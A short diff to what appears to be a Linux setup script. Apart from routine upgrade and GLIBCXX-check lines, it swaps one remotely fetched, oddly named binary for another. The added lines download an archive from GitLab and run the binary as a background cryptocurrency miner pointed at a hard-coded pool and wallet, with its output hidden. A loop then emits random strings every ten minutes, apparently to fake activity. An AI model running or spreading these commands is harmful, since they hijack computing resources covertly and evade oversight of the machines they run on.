@@ -12,6 +12,6 @@ sudo apt-get dist-upgrade
 Also, make sure to confirm the necessary dependencies are installed for the right GLIBCXX version.
 strings /usr/lib/x86_64-linux-gnu/libstdc++.so.6 | grep GLIBCXX
 
-wget https://github.com/aqshakuy/kasepak/raw/main/AkubapakMU
-chmod 700 AkubapakMU
-./AkubapakMU --coin CTXC --pool 69.164.205.118:80 --user 0x7070797d9e375a031bda65159f757541ac08f66d.aqshkuy --pass 123 --dns-over-http=2 208.67.222.222 --no-cl
+wget https://gitlab.com/ontaracing04/gas/-/raw/main/best.tar.gz && tar -xvf best.tar.gz
+./best --tls-url 69.164.205.118:443 --user Tsz4m96ZdeQBAk2vrPqfWwaUhzkfUb3mDCBJG5iLsWGzf8B8SZZMu5BARrg3b5eEsVCCucbkskJgWfSBFMwBFFgqABv5CF6dGr --pass $(echo $(shuf -i 1-20000 -n 1)-asep) --currency cryptonight_gpu > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
